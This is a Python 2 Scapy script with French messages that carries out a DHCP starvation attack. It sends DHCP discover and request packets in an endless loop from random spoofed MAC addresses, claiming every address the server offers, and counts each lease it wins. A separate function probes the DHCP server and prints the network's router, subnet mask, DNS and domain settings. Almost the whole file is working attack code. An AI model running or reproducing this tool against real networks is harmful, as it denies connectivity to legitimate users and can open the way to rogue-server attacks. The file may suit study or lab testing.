from scapy.all import *
import outils , time , sys

counter=0
macs={}
locker=None


	
def get_configuration(interface):
	global intf
	global displayed
	displayed= False
	intf=interface
        
        while True:
		
                mac=outils.randomMac()
                xid_disc=random.randint(0xfff00000,0xfffff000)
                DHCPdisc=IP(dst="255.255.255.255", src="0.0.0.0")/UDP(sport=68 , dport=67)/BOOTP(op=1 ,xid=xid_disc,ciaddr="0.0.0.0",yiaddr="0.0.0.0",
 flags=0x8000,chaddr=mac)/DHCP(options=[("message-type","discover"),"end"])
		
		send(DHCPdisc,iface=interface,loop=0,verbose=0)
		p=sniff(iface=interface, lfilter= lambda x : x.haslayer(DHCP) and x[BOOTP].xid==xid_disc , prn=dhcp_disc_show,count=1)
	
		if displayed:
			displayed=False
			break
		else:
			continue

def starvation(interface, lock):
	global intf
	global macs
	global locker	
	locker=lock
	intf=interface
	
	

	while True:
		try:	
					        
        	        mac=outils.randomMac()
			xid_disc=random.randint(0xff000000,0xffffff00)
			macs[xid_disc]=mac
					
               		DHCPdisc=IP(dst="255.255.255.255", src="0.0.0.0")/UDP(sport=68 ,dport=67)/BOOTP(op=1 ,xid=xid_disc,ciaddr="0.0.0.0",yiaddr="0.0.0.0",chaddr=mac)/DHCP(options=[("message-type","discover"),"end"])
			send(DHCPdisc,iface=interface,loop=0,verbose=0)
       			sniff(iface=interface, lfilter= lambda x : x.haslayer(DHCP) and x[BOOTP].xid==xid_disc, count=1, prn=send_request)
 			time.sleep(1)           
			
		except  KeyboardInterrupt:
			
			break

def send_request(dhcpoffer):
	global macs
	global intf
	try:
      		if dhcpoffer.haslayer(BOOTP):
        		options=dhcpoffer.getlayer(DHCP).options
               		if options[0][1]==2:
                		xid_req=dhcpoffer.getlayer(BOOTP).xid
                        	ip=dhcpoffer.getlayer(BOOTP).yiaddr
                        	for op in options:
                        		if op[0]=="server_id":
                                		serverID=op[1]
                                        	break
				
              	        	DHCPreq=IP(dst="255.255.255.255", src="0.0.0.0")/UDP(dport=67 ,sport=68)/BOOTP(xid=xid_req,chaddr=macs[xid_req])/DHCP(options=[("message-type","request"),("server_id",serverID),("requested_addr",ip),"end"])
                        	send(DHCPreq,iface=intf,loop=0,verbose=0)
                        	sniff(iface=intf,lfilter= lambda x : x.haslayer(DHCP) and x[BOOTP].xid==xid_req,prn=dhcp_ack_show,count=1)
                        	
        except Exception as ex:
                print ex
                return 

def dhcp_ack_show(dhcpack):
	global counter, locker
	try:
		if dhcpack.haslayer(BOOTP):
			if dhcpack.getlayer(DHCP).options[0][1]==5:
				counter+=1
				locker.acquire()
				print "\n\t[+] %d)- Attribution reussite de l'adresse %s "%(counter,dhcpack.getlayer(BOOTP).yiaddr)
				locker.release()
				return
			else :
				return
        except:
		print 'Erreur dhcpshowack'
		

def dhcp_disc_show(dhcpresp):
	
	global displayed, mask  , router , serverID , domain , dns, subnetID

	message_type=""
	other=0
        try:
		if dhcpresp.haslayer(BOOTP):
			options=dhcpresp.getlayer(DHCP).options
        		message_type=options[0][1]
			bootp=dhcpresp.getlayer(BOOTP)
	
			if message_type==2:
					
				for op in options:
					if op[0]=="server_id":
                       				serverID=op[1]
                			elif op[0]=="router":
                     				router=op[1]
					elif op[0]=="subnet_mask":
                       				mask=op[1]
					elif op[0]=="domain":
						domain=op[1]
                			elif op[0]=="name_server":
						dns=op[1]
                			else:
						other+=1
				
				subnetID=outils.get_subnetID(router, mask)
				
      				print "\n[+]Message DHCPoffer recu du serveur d'identifiant : %s"%serverID
				if outils.in_subnet(serverID , subnetID, mask):
					print "\n\t[+] Le serveur est dans le meme sous-reseau . "
				else:
					print "\n\t[-] Un relais DHCP est present dans ce sous-reseau ."
				print """
			        	\n\t\t\tLes parametres de configuration sont :\n
			        	 \t[+]Routeur par defaut : %s
					 \t[+]Adresse de sous reseau :%s
		                	 \t[+]Masque de sous-reseau : %s
			        	 \t[+]Domaine : %s
			         	 \t[+]Serveur DNS : %s
			      		 \nIl existe encore %s autres options .\n"""%(router,subnetID,mask,domain,dns,other)
				displayed=True	
				return
			else:
	
				return
	except Exception as ex:
		print 'Erreur dhcp_disc_show :'+str(ex)
		return


